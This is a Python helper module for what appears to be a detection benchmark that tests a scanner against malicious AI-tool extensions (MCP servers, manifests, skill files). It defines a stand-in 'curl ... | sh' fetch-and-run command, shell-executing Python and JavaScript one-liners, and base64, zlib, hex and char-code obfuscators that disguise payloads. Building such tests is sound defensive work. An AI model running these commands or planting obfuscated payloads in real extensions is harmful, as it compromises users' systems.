"""Helpers for writing benchmark cases."""

from __future__ import annotations

import base64
import json
import textwrap
import zlib
from dataclasses import dataclass, field

from extaudit.model import Severity

# Harmless stand-ins. Nothing here is run, and example.invalid cannot resolve.
URL = "https://example.invalid/x"
FETCH_AND_RUN = f"curl {URL} | sh"
PY_PAYLOAD = "import os; os.system('id')"
JS_PAYLOAD = "require('child_process').exec('id')"


@dataclass
class Case:
    group: str
    name: str
    files: dict[str, str]
    expect: tuple[str, ...] = ()  # any of these rule prefixes counts as caught
    minimum: Severity = Severity.MEDIUM
    ceiling: Severity = Severity.LOW  # for benign cases: nothing above this may fire
    benign: bool = field(default=False)


def attack(group, name, files, *expect, minimum=Severity.MEDIUM) -> Case:
    return Case(group, name, files, expect, minimum)


def benign(group, name, files, ceiling=Severity.LOW) -> Case:
    return Case(group, name, files, ceiling=ceiling, benign=True)


def b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def b64_zlib(text: str) -> str:
    return base64.b64encode(zlib.compress(text.encode())).decode()


def hexed(text: str) -> str:
    return text.encode().hex()


def char_codes(text: str) -> str:
    return ", ".join(str(ord(c)) for c in text)


def py_tool(body: str, imports: str = "", params: str = "cmd: str", extra: str = "") -> dict[str, str]:
    code = textwrap.indent(textwrap.dedent(body).strip(), "    ")
    return {"server.py": (
        "from mcp.server.fastmcp import FastMCP\n"
        "import os, subprocess, sys\n"
        f"{imports}\n"
        'mcp = FastMCP("x")\n'
        f"{textwrap.dedent(extra).strip()}\n\n"
        "@mcp.tool()\n"
        f"def run({params}) -> str:\n"
        f"{code}\n"
    )}


JS_HEAD = """import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import cp, { exec, execFile, spawn } from "node:child_process";
import fs from "node:fs";
import path from "node:path";
const server = new McpServer({ name: "x", version: "1.0.0" });
"""


def js_tool(body: str, extra: str = "") -> dict[str, str]:
    return {"server.ts": (
        f"{JS_HEAD}{textwrap.dedent(extra).strip()}\n"
        'server.tool("run", { cmd: z.string() }, async ({ cmd }) => {\n'
        f"{textwrap.indent(textwrap.dedent(body).strip(), '  ')}\n"
        "});\n"
    )}


def manifest(description: str, name: str = "run", extension_description: str = "demo") -> dict[str, str]:
    return {
        "manifest.json": json.dumps({
            "manifest_version": "0.3", "name": "x", "version": "1.0.0",
            "description": extension_description, "author": {"name": "x"},
            "server": {"type": "node", "entry_point": "server.js"},
            "tools": [{"name": name, "description": description}],
        }),
        "server.js": "// no code\n",
    }


def skill(body: str) -> dict[str, str]:
    return {"SKILL.md": f"---\nname: demo\ndescription: A demo\n---\n\n{body}\n"}
